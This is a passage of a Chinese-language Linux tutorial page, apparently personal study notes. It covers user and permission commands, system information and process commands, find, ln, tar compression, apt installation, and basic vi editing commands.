<td>查看当前所有登录的用户列表</td>
</tr>
<tr>
<td>whoami</td>
<td>查看当前登录用户的账户名</td>
</tr>
</tbody></table>
<p><strong>passwd</strong> <strong>文件</strong></p>
<p>/etc/passwd  文件存放的是用户的信息，由6个分号组成的7个信息，分别是：</p>
<p>1.用户名    </p>
<p>2.密码（x，表示加密的密码）</p>
<p>3.UID（用户标识）</p>
<p>4.GID（组标识）</p>
<p>5.用户全名或者本地账号</p>
<p>6.家目录</p>
<p>7.登录使用的Shell，就是登录之后，使用的只能终端命令，Ubuntu默认是dash</p>
<h5 id="在passwd中是以冒号来分组信息的每一个冒号分隔一个信息"><a href="#在passwd中是以冒号来分组信息的每一个冒号分隔一个信息" class="headerlink" title="在passwd中是以冒号来分组信息的每一个冒号分隔一个信息"></a>在passwd中是以冒号来分组信息的每一个冒号分隔一个信息</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575078286479.png" alt="1575079659167"></p>
<p><strong>介绍</strong>：</p>
<p>一开始  表示当前用户名，第二个 x 表示这个用户是有密码的，但是密码是加密的，第三个1001表示用户名的代号，后面的1001表示lisi这个用户所归属的组的代号，：：这一列是空的表示lisi用户的全名，如果没有设置就用用户名做为lisi的全名    /home/lisi   表示用户所在的家目录</p>
<p><strong>usermod</strong></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575177656536.png" alt="1575080878199"></p>
<p>usermod <strong>-g</strong>  组  用户名   <strong>修改的是主组</strong></p>
<p>usermod <strong>-G</strong>  组  用户名   <strong>修改的是附加组</strong>            </p>
<h4 id="which（重要）"><a href="#which（重要）" class="headerlink" title="which（重要）"></a>which（重要）</h4><p>/etc/passwd 用于保存用户信息的文件</p>
<p>/usr/bin/passwd 用于修改用户密码的程序</p>
<p><strong>which 命令可以查询我们能执行终端命令所在位置。</strong></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575080878199.png" alt="1575083593355"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575083593355.png" alt="1575083562422"></p>
<h4 id="3-3-切换用户"><a href="#3-3-切换用户" class="headerlink" title="3.3 切换用户"></a>3.3 切换用户</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>su - 用户名</td>
<td>切换用户，并且切换目录</td>
<td>- 可以切换到用户家目录，否则保持位置不变</td>
</tr>
<tr>
<td>exit</td>
<td>退出当前登录账户</td>
<td></td>
</tr>
</tbody></table>
<p><strong>su 不接用户名，可以切换到root身份</strong>，root对系统所有资源都有管理权限，不推荐使用，因为不安全。</p>
<h4 id="0-4-修改文件权限"><a href="#0-4-修改文件权限" class="headerlink" title="0.4 修改文件权限"></a>0.4 修改文件权限</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>chown</strong></td>
<td><strong>修改拥有者</strong></td>
</tr>
<tr>
<td><strong>chgrp</strong></td>
<td><strong>修改组</strong></td>
</tr>
<tr>
<td><strong>chmod</strong></td>
<td><strong>修改权限</strong></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 修改文件 | 目录拥有者</span><br><span class="line">chown 用户名 文件名 | 目录名	</span><br><span class="line"></span><br><span class="line"># 递归修改文件|目录的组</span><br><span class="line">chgrp -R 组名 文件名|目录名</span><br><span class="line"></span><br><span class="line">#递归修改文件权限</span><br><span class="line">chmod -R 755 文件名|目录名</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>chmod 在设置权限时</strong>，可以简单地使用三个数字分别对应 <strong>7表示拥有者的意思第二个5表示组的意思</strong> 和 <strong>第三个5表示其他用户的权限</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#   chmod+&#x2F;-rwx 可以直接修改文件|目录的  读|写|执行 权限，但是不能精确到 拥有者|组|其他</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575083562422.png" alt="1575177656536"></p>
<h2 id="系统信息相关命令"><a href="#系统信息相关命令" class="headerlink" title="系统信息相关命令"></a>系统信息相关命令</h2><p>学习目标</p>
<p>通过远程终端维护服务器时，查看服务器上当前 <strong>系统日期和时间/磁盘空间占用情况/程序执行情况</strong></p>
<p>本小结学习的终端命令进本都是查询命令，通过这些命令对系统资源的使用情况有个了解</p>
<h4 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a>目标</h4><ul>
<li><p>时间和日期</p>
<ul>
<li>date</li>
<li>cal</li>
</ul>
</li>
<li><p>磁盘和目录空间</p>
<ul>
<li>df</li>
<li>du</li>
</ul>
</li>
<li><p>进程信息</p>
<ul>
<li>ps</li>
<li>top</li>
<li>kill</li>
</ul>
</li>
</ul>
<h5 id="01-时间和日期"><a href="#01-时间和日期" class="headerlink" title="01.时间和日期"></a>01.时间和日期</h5><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>date</td>
<td>查看系统时间</td>
</tr>
<tr>
<td>cal</td>
<td>calendar 查看日历，-y选项可以查看一年的日历</td>
</tr>
</tbody></table>
<h4 id="02-磁盘信息"><a href="#02-磁盘信息" class="headerlink" title="02.磁盘信息"></a>02.磁盘信息</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>df -h</td>
<td>显示磁盘剩余空间</td>
</tr>
<tr>
<td>du -h [目录名]</td>
<td>显示目录下的文件大小</td>
</tr>
</tbody></table>
<ul>
<li>选项说明    </li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-h</td>
<td>以人性化的方式显示文件大小</td>
</tr>
</tbody></table>
<h4 id="03-进程信息"><a href="#03-进程信息" class="headerlink" title="03.进程信息"></a>03.进程信息</h4><ul>
<li>所谓进程，通俗的说就是 <strong>当前正在执行的一个程序</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>ps aux</td>
<td>process status查看进程的详细状况</td>
</tr>
<tr>
<td>top</td>
<td>动态显示运行中的进程并且排序</td>
</tr>
<tr>
<td>kill[-9] 进程代号</td>
<td>终止指定代号的进程，-9 表示强行终止</td>
</tr>
</tbody></table>
<blockquote>
<p>ps 默认智慧显示当前用户通过终端启动的应用程序</p>
</blockquote>
<ul>
<li><p>ps 选项说明功能    </p>
<p><strong>PID ** 表示 **进程代号</strong></p>
<p><strong>user</strong> 表示 <strong>当前用户身份</strong></p>
</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>显示终端上的所有进程，包括其他用户的进程</td>
</tr>
<tr>
<td>u</td>
<td>显示进程的详细状态</td>
</tr>
<tr>
<td>x</td>
<td>显示没有控制终端的进程</td>
</tr>
</tbody></table>
<p><strong>kill -9 进程代号</strong>    中的 <strong>-9 表示强行终止</strong>，而<strong>-9通常用在</strong></p>
<p><strong>单纯用kill无法结束的进程</strong> 就可以<strong>加一个 -9</strong>，</p>
<blockquote>
<p>提示：使用kill命令时，最好只终止当前用户开启的进程，而不要终止root身份开启的进程，否则可能导致系统崩溃</p>
<ul>
<li>要退出top可以直接输入q</li>
</ul>
</blockquote>
<p><strong>kill命令使用时，先用ps查询进程代号，再用kill结束想要结束的进程。</strong></p>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><ul>
<li><p>查找文件</p>
<ul>
<li>find</li>
</ul>
</li>
<li><p>软连接</p>
<ul>
<li>ln</li>
</ul>
</li>
<li><p>打包和压缩</p>
<ul>
<li>tar</li>
</ul>
</li>
<li><p>软件安装</p>
<ul>
<li>apt-get</li>
</ul>
</li>
</ul>
<h4 id="01-查找文件"><a href="#01-查找文件" class="headerlink" title="01.查找文件"></a>01.查找文件</h4><ul>
<li>find命令功能非常强大，通常用来在  <strong>特定的目录下 搜索</strong> 符合条件的文件</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>find[路径] -name “*搜索条件”</td>
<td>查找指定路径下的文件，包括子目录</td>
</tr>
</tbody></table>
<ul>
<li>如果省略路径，表示在当前文件夹下查找</li>
<li>之前的通配符，在使用find命令时也可以使用</li>
</ul>
<h4 id="演练目标"><a href="#演练目标" class="headerlink" title="演练目标"></a>演练目标</h4><ul>
<li>1.搜索桌面目录下，文件名包含 1 的文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find [桌面&#x2F;] -name “*1*”</span><br></pre></td></tr></table></figure>

<ul>
<li><ol start="2">
<li>搜索桌面目录下，所有以 .txt 为扩展名的文件</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find [桌面&#x2F;] -name &quot;*.txt&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>3.搜索桌面目录下，以数字1开头的文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find [桌面&#x2F;] -name &quot;1*&quot;</span><br></pre></td></tr></table></figure>

<p>如果省略路径，是搜索当前路径下的全部文件和目录</p>
<h4 id="02-软连接"><a href="#02-软连接" class="headerlink" title="02.软连接"></a>02.软连接</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ln -s 被链接的源文件链接文件</strong></td>
<td>建立文件的软链接，用通俗的方式讲<strong>类似于Windows</strong>下的 <strong>快捷方式</strong></td>
</tr>
</tbody></table>
<ul>
<li><p>注意：</p>
</li>
<li><p>1.没有 -s 选项建立的是一个 硬链接文件      <strong>-s选项是不能省略的</strong></p>
</li>
<li><p>两个文件占用相同大小的硬盘空间，工作中几乎不会建立文件的硬链接</p>
</li>
<li><p>2源文件要使用绝对路径，不能使用相对路径，这样可以方便移动链接文件后，仍然能够正常使用</p>
<h4 id="硬链接（知道）"><a href="#硬链接（知道）" class="headerlink" title="硬链接（知道）"></a>硬链接（知道）</h4></li>
<li><p>在使用ln 创建链接时，如果没有-s 选项 ，会创建一个硬链接，而不是软连接</p>
</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575263025925.png" alt="1575197462224"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575197931725.png" alt="1575197931725"></p>
<h4 id="03-打包压缩"><a href="#03-打包压缩" class="headerlink" title="03.打包压缩"></a>03.打包压缩</h4><ul>
<li>打包压缩 是日常工作中备份文件的一种方式</li>
<li>在不同操作系统中，常用的打包压缩方式是不同的<ul>
<li>在Windows 常用 rar</li>
<li>mac 常用 zip</li>
<li>Linux 常用 tar.gz</li>
</ul>
</li>
</ul>
<h4 id="3-1打包-压缩"><a href="#3-1打包-压缩" class="headerlink" title="3.1打包/压缩"></a>3.1打包/压缩</h4><ul>
<li>tar 是linux中最常用的<strong>备份</strong> 工具，此命令可以 把一系列文件 打包到 <strong>一个大文件中</strong>，也可以把一个 打<strong>包的大文件恢复成一系列文件</strong></li>
<li>tar命令格式 如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打包文件</span><br><span class="line">tar -cvf 打包文件.tar 被打包文件&#x2F;路径...</span><br><span class="line"></span><br><span class="line">#解包文件</span><br><span class="line">tar -xvf 打包文件.tar</span><br></pre></td></tr></table></figure>

<ul>
<li>tar 选项说明</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>c</strong></td>
<td><strong>生成档案文件，创建打包文件</strong></td>
</tr>
<tr>
<td><strong>x</strong></td>
<td><strong>揭开档案文件</strong></td>
</tr>
<tr>
<td><strong>v</strong></td>
<td><strong>列出归档解档的详细过程，显示进度</strong></td>
</tr>
<tr>
<td><strong>f</strong></td>
<td><strong>指定档案文件名称，f后面一定是.tar文件,所以必须放选项最后</strong></td>
</tr>
</tbody></table>
<blockquote>
<p>注意：<strong>f选项必须放在最后</strong>，其他选项顺序随意。</p>
</blockquote>
<p><strong>tar 只负责打包不负责压缩</strong></p>
<h4 id="3-2压缩-解压缩"><a href="#3-2压缩-解压缩" class="headerlink" title="3.2压缩/解压缩"></a>3.2压缩/解压缩</h4><p><strong>1）gzip</strong></p>
<ul>
<li>tar与gzip命令结合可以是实现文件 打包和压缩<ul>
<li>tar 只负责打包文件，但不压缩</li>
<li>用gzip压缩tar打包后的文件，其扩展名一般用xxx.tar.gz</li>
</ul>
</li>
</ul>
<blockquote>
<p>在linux中，最常见的压缩文件格式就是xxx.tar.gz</p>
</blockquote>
<ul>
<li>在tar 命令中有一个选项 -z 可以调用gzip ，从而可以方便的实现压缩和解压缩的功能</li>
<li>命令格式如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 压缩文件</span><br><span class="line">tar -zcvf 打包文件.tar.gz 被压缩的文件&#x2F;路径...</span><br><span class="line"></span><br><span class="line">#  解压缩文件</span><br><span class="line">tar -zxvf 打包文件.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压缩到指定路径</span><br><span class="line">tar -zxvf 打包文件.tar.gz -C 目标路径</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-C</strong></td>
<td>解压缩到指定目录，注意：<strong>要解压缩的目录必须存在</strong> <br>如果不存在解压缩无法完成。</td>
</tr>
</tbody></table>
<p><strong>2）bzip2（two）</strong></p>
<ul>
<li><p>tar与bzip2 命令结合可以使用实现文件打包和压缩（用法和gzip一样）</p>
<ul>
<li>tar 只负责打包文件，但不压缩</li>
<li><strong>用bzip2 压缩 tar 打包后的文件，其扩展名一般用xxx.tar.bz2</strong></li>
</ul>
</li>
<li><p>在 <strong>tar 命令中</strong>有一个选项 <strong>-j</strong> 可以调用 <strong>bzip2</strong>，从未可以方便的<strong>实现压缩和及压缩的功能</strong></p>
</li>
<li><p>命令格式如下：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 压缩文件</span><br><span class="line">tar -jcvf 打包文件.tar.bz2 被压缩的文件&#x2F;路径..</span><br><span class="line"></span><br><span class="line">#解压缩文件</span><br><span class="line">tar -jxvf 打包文件.tar.bz2</span><br></pre></td></tr></table></figure>

<p>想要用<strong>gzip</strong> 时候 加  <strong>-z</strong>   想要用<strong>bzip2</strong> 加  <strong>-j</strong></p>
<h4 id="04-软件安装"><a href="#04-软件安装" class="headerlink" title="04.软件安装"></a>04.软件安装</h4><h5 id="4-1-通过apt-安装-卸载软件"><a href="#4-1-通过apt-安装-卸载软件" class="headerlink" title="4.1.通过apt 安装/卸载软件"></a><strong>4.1.通过apt 安装/卸载软件</strong></h5><ul>
<li>apt 是Advanced Packaging Tool,是Linux下的一款安装包管理工具</li>
<li>可以在终端中方便的 <strong>安装/卸载/更新软件包</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 1.安装软件</span><br><span class="line">$ sudo apt install 软件包</span><br><span class="line"></span><br><span class="line"># 2.卸载软件</span><br><span class="line">$ sudo apt remove 软件名</span><br><span class="line"></span><br><span class="line"># 3.更新已安装的包</span><br><span class="line">$ sudo apt upgrade</span><br></pre></td></tr></table></figure>

<p><strong>要使用 apt 必须要用 sudo 用 root 身份执行</strong></p>
<p>安装演练</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一个小火车提示</span><br><span class="line">$ sudo apt install sl</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575263077714.png" alt="1575263077714"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一个比较漂亮的查看当前进程排名的软件</span><br><span class="line">$ sudo apt install htop</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575197462224.png" alt="1575263025925"></p>
<h4 id="4-2配置软件源"><a href="#4-2配置软件源" class="headerlink" title="4.2配置软件源"></a>4.2配置软件源</h4><ul>
<li>如果希望Ubuntu 中安装软件，<strong>更加快速</strong>，可以通过<strong>设置镜像源</strong>，选择一个访问网速更快的服务器来提供软件下载/安装服务</li>
<li>提示：更换服务器之后，需要一个相对不较长时间的更新过程，需要耐心等待。更新完成后，在安装软件都会从新设置的服务器下载软件了</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575263291116.png" alt="1575263291116"></p>
<p><strong>软件源概念：</strong></p>
<p>Ubuntu提供有一个<strong>主服务器，</strong>主服务器有<strong>所有软件的安装包</strong>，我们就会吧这个<strong>主服务器叫做软件源</strong>，所谓软件源，就是<strong>提供所有软件安装包的源头</strong>。</p>
<p><strong>镜像源概念：</strong></p>
<blockquote>
<p>所谓镜像源，就是<strong>所有服务器的内容是相同的（镜像）</strong>，但是根据所在位置不同，国内服务器通常速度会更快一些！</p>
</blockquote>
<h2 id="vi——终端中的编辑器"><a href="#vi——终端中的编辑器" class="headerlink" title="vi——终端中的编辑器"></a>vi——终端中的编辑器</h2><h4 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a>目标</h4><ul>
<li>vi简介</li>
<li>打开和新建文件</li>
<li>三种工作模式</li>
<li>常用命令</li>
<li>分屏命令</li>
<li>常用命令速查图</li>
</ul>
<h4 id="01-vi简介"><a href="#01-vi简介" class="headerlink" title="01.vi简介"></a>01.vi简介</h4><h5 id="1-1学习-vi-的目的"><a href="#1-1学习-vi-的目的" class="headerlink" title="1.1学习 vi 的目的"></a>1.1学习 vi 的目的</h5><ul>
<li>在工作中，要对 服务器 上的文件进行 简单 的修改，可以使用ssh远程登录到服务器上，并且使用vi进行快速的编辑即可</li>
<li>常见需要修改的文件包括：<ul>
<li>源程序</li>
<li>配置文件，例如ssh的配置文件~/.ssh/config</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li>在没有图形界面的环境下，要编辑文件，vi是最佳选择</li>
<li>每一个要使用Linux的程序员，都应该或多或少学习一些vi的常用命令</li>
</ul>
</blockquote>
<h5 id="1-2vi-和-vim"><a href="#1-2vi-和-vim" class="headerlink" title="1.2vi 和 vim"></a>1.2vi 和 vim</h5><ul>
<li><p>vi的特点</p>
<ul>
<li><strong>没有图形界面</strong> 的 <strong>功能强大</strong>  的<strong>编辑器</strong></li>
<li>只能是编辑 <strong>文本内容，</strong> 不能对字体、段落进行排版</li>
<li><strong>不只吃鼠标操作</strong></li>
<li><strong>没有菜单</strong></li>
<li><strong>只有命令</strong></li>
</ul>
</li>
<li><p><strong>vi 编辑器</strong>在 <strong>系统管理、服务器管理</strong> 编辑文件时，<strong>其功能永远不是图形界面的编辑器能比拟的</strong></p>
</li>
</ul>
<h4 id="02-打开和新建文件"><a href="#02-打开和新建文件" class="headerlink" title="02.打开和新建文件"></a>02.打开和新建文件</h4><ul>
<li>在终端中<strong>输入vi 在后面跟上文件名</strong> 即可</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vi 文件名</span><br></pre></td></tr></table></figure>

<ul>
<li>如果文件已经存在，会直接打开文件</li>
<li>如果文件不存在，会新建一个文件</li>
</ul>
<h4 id="2-1-打开文件并且定位行"><a href="#2-1-打开文件并且定位行" class="headerlink" title="2.1 打开文件并且定位行"></a>2.1 打开文件并且定位行</h4><p>用 <strong>vi</strong> 打开已有内容的文件后，按 <strong>i 进行编辑模式</strong></p>
<ul>
<li>在日常工作中，有可能会遇到 打开一个文件，并定位到指定行 的情况</li>
<li>例如：在开发时，知道某一行代码有错，可以 快速定位 到出错代码的位置</li>
<li>这个时候，可以使用以下命令打开</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vi 文件名 +行数</span><br><span class="line">如果只带上+而不指定行数，或直接定位在末尾</span><br></pre></td></tr></table></figure>

<h4 id="2-2异常处理"><a href="#2-2异常处理" class="headerlink" title="2.2异常处理"></a>2.2异常处理</h4><ul>
<li>如果vi异常退出，再吃攀上可能会保存有交换问及那</li>
<li>下次在使用vi编辑该文件是，会看到一下屏幕信息，按下字母d可以删除交换文件即可</li>
</ul>
<blockquote>
<p>提示：按下键盘是之一关闭输入法</p>
</blockquote>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575267483535.png" alt="1575267483535"></p>
<h4 id="末行模式命令"><a href="#末行模式命令" class="headerlink" title="末行模式命令"></a>末行模式命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>w</td>
<td>保存</td>
</tr>
<tr>
<td>q</td>
<td>退出，如果没有保存，不允许退出</td>
</tr>
<tr>
<td>q！</td>
<td>强行退出，不保存退出</td>
</tr>
<tr>
<td>wq</td>
<td>保存并退出</td>
</tr>
<tr>
<td>x</td>
<td>保存并退出</td>
</tr>
</tbody></table>
<h4 id="04-vi-常用命令"><a href="#04-vi-常用命令" class="headerlink" title="04.vi 常用命令"></a>04.vi 常用命令</h4><h4 id="4-1移动（基本）"><a href="#4-1移动（基本）" class="headerlink" title="4.1移动（基本）"></a>4.1移动（基本）</h4><h5 id="1）上、下、左、右"><a href="#1）上、下、左、右" class="headerlink" title="1）上、下、左、右"></a>1）上、下、左、右</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>h</td>
<td>向左</td>
</tr>
<tr>
<td>j</td>
<td>向下</td>
</tr>
<tr>
<td>k</td>
<td>向上</td>
</tr>
<tr>
<td>l</td>
<td>向右</td>
</tr>
</tbody></table>
<h5 id="2）行内移动"><a href="#2）行内移动" class="headerlink" title="2）行内移动"></a>2）行内移动</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>w</td>
<td>向后移动一个单词</td>
</tr>
<tr>
<td>b</td>
<td>向前移动一个单词</td>
</tr>
<tr>
<td>0</td>
<td>行首</td>
</tr>
<tr>
<td>^</td>
<td>行首，第一个不是空白符的位置</td>
</tr>
<tr>
<td>$</td>
<td>行尾</td>
</tr>
</tbody></table>
<h5 id="3）行数移动"><a href="#3）行数移动" class="headerlink" title="3）行数移动"></a>3）行数移动</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>gg</td>
<td>文件顶部</td>
</tr>
<tr>
<td>G</td>
<td>文件末尾</td>
</tr>
<tr>
<td>数字gg</td>
<td>移动到 数字 对应行数</td>
</tr>
<tr>
<td>数字G</td>
<td>移动到 数字 对应行数</td>
</tr>
<tr>
<td>：数字</td>
<td>移动到数字对应行数</td>
</tr>
</tbody></table>
<h5 id="4）屏幕移动"><a href="#4）屏幕移动" class="headerlink" title="4）屏幕移动"></a>4）屏幕移动</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl+b</td>
<td>向上翻页</td>
</tr>
<tr>
<td>Ctrl+f</td>
<td>向下翻页</td>
</tr>
<tr>
<td>H</td>
<td>屏幕顶部</td>
</tr>
<tr>
<td>M</td>
<td>屏幕中间</td>
</tr>
<tr>
<td>L</td>
<td>屏幕底部</td>
</tr>
</tbody></table>
<h5 id="4-2移动（程序）"><a href="#4-2移动（程序）" class="headerlink" title="4.2移动（程序）"></a>4.2移动（程序）</h5><p><strong>1）段落移动</strong></p>
<ul>
<li>在vi中使用 空行 来区分段落</li>
<li>在程序开发是，通常 一段功能相关的代码会写在一起  ——  之间没有空行</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>{</td>
<td>上一段</td>
</tr>
<tr>
<td>}</td>
<td>下一段</td>
</tr>
</tbody></table>
<p><strong>2）括号切换</strong></p>
<ul>
<li>在程序世界中，{}、[]、()  使用频率很高，而且  <strong>都是成对出现的</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>%</td>
<td>括号匹配及切换</td>
</tr>
</tbody></table>
<h5 id="3）标记"><a href="#3）标记" class="headerlink" title="3）标记"></a>3）标记</h5><ul>
<li>在开发时，某一块代码可能 需要稍后处理，例如：编辑、查看</li>
<li>此时先使用 m 增加一个标记，这样可以 在需要时快速的跳转回来  或者  执行其他编辑操作</li>
<li>标记名称  可以是 a~z 之间的任意 一个 字母 </li>
<li>添加了标记的  行如果被删除，标记同时被删除</li>
<li>如果  在其他行添加了相同名称的标记，之前添加的标记也会被替换掉</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>mx</td>
<td>添加标记x，x是a<del>z 或者A</del>Z之间的任意一个字母</td>
</tr>
<tr>
<td>‘x</td>
<td>直接定位到标记x所在位置</td>
</tr>
</tbody></table>
<h4 id="选中文本（可视模式）"><a href="#选中文本（可视模式）" class="headerlink" title="选中文本（可视模式）"></a>选中文本（可视模式）</h4><ul>
<li>学习复制命令前，应该先学会 <strong>怎样选中 要复制的代码</strong></li>
<li>在 vi 中 要选择文本，需要先使用 visual 命令切换到 <strong>可视模式</strong></li>
<li>vi 中提供了 三种 可是模式，可以方便程序员选择  <strong>选中文本的方式</strong></li>
<li>按ESC 可以放弃选中，返回  <strong>命令模式</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>模式</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>v</strong></td>
<td><strong>可视模式</strong></td>
<td><strong>从光标位置开始按照正常模式选择文本</strong></td>
</tr>
<tr>
<td><strong>V</strong></td>
<td><strong>可视行模式</strong></td>
<td><strong>选中光标经过的完整行</strong></td>
</tr>
<tr>
<td><strong>Ctrl + v</strong></td>
<td><strong>可是块模式</strong></td>
<td><strong>垂直方向选中文本</strong></td>
</tr>
</tbody></table>
<ul>
<li><strong>可视模式下</strong> ，可以和 <strong>移动命令</strong> 连用， 例如：ggVG 能够选中所有内容</li>
</ul>
<h4 id="4-4撤销和恢复撤销"><a href="#4-4撤销和恢复撤销" class="headerlink" title="4.4撤销和恢复撤销"></a>4.4撤销和恢复撤销</h4><ul>
<li>在学 编辑命令 之前，先要知道怎样撤销之前一次 错误的 编辑动作~</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>u</td>
<td>undo</td>
<td>撤销上次命令</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td>redo</td>
<td>恢复撤销的命令</td>
</tr>
</tbody></table>
<h4 id="4-5删除文本"><a href="#4-5删除文本" class="headerlink" title="4.5删除文本"></a>4.5删除文本</h4><table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>x</td>
<td>cut</td>
<td>删除光标所在字符，胡总和选中文字</td>
</tr>
<tr>
<td>d（移动命令）</td>
<td>delete</td>
<td>删除移动命令对应的内容</td>
</tr>
<tr>
<td>dd</td>
<td>delete</td>
<td>删除光标所在行，可以 ndd 复制多行</td>
</tr>
<tr>
<td>D</td>
<td>delete</td>
<td>删除至行尾</td>
</tr>
</tbody></table>
<blockquote>
<p>提示：如果使用 可视模式 已经选中了一段文本，那么无论使用 d 还是 x，都可以删除选中文本</p>
</blockquote>
<ul>
<li>删除命令可以和 移动命令 连用，一下常见的组合命令：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* d0       #  从光标位置删除到一行的起始位置</span><br><span class="line">* d&#125;       #  从光标位置删除到段落的结尾</span><br><span class="line">* ndd      #  从光标位置向下连续删除 n 行</span><br><span class="line">* d代码行G  #  从光标所在行  删除到 指定代码行  之间的所有代码</span><br><span class="line">* d&#39;a      #  从光标所在行  产出到 标记a  之间的所有代码</span><br></pre></td></tr></table></figure>

<h4 id="4-6-复制、粘贴"><a href="#4-6-复制、粘贴" class="headerlink" title="4.6 复制、粘贴"></a>4.6 复制、粘贴</h4><ul>
<li><strong>vi</strong> 中提供有一个 <strong>被复制文本的缓冲区</strong><ul>
<li><strong>复制</strong> 命令会将选中的文字保存在缓冲区</li>
<li><strong>删除</strong> 命令删除的文字会被保存在缓冲区</li>
<li>再所需的位置，使用 <strong>粘贴</strong> 命令可以将缓冲区的文字<strong>插入到光标所在位置</strong></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>y（移动命令）</strong></td>
<td><strong>copy</strong></td>
<td><strong>复制</strong></td>
</tr>
<tr>
<td><strong>yy</strong></td>
<td><strong>copy</strong></td>
<td><strong>复制一行，可以nyy复制多行</strong></td>
</tr>
<tr>
<td><strong>p</strong></td>
<td><strong>paste</strong></td>
<td><strong>粘贴</strong></td>
</tr>
</tbody></table>
<p><strong>注意</strong></p>
<ul>
<li>命令   <strong>d、x</strong>   本质是<strong>剪切命令</strong>，但<strong>被放入文本缓冲区</strong>，如果有其他<strong>复制或者剪贴命令，之前的剪切内容将被替换。</strong>   也就是说 <strong>vi  中没有删除命令</strong>，<strong>只有剪贴命令，而剪切命令也被认为是删除命令</strong></li>
<li>vi中的 <strong>文本缓冲区</strong>  和   <strong>系统的剪贴板</strong>  不是同一个</li>
<li>所以在其他软件中使用 <strong>Ctrl+C</strong> 复制的内容跟，不能再 <strong>vi</strong> 中通过  <strong>P</strong>  命令粘贴</li>
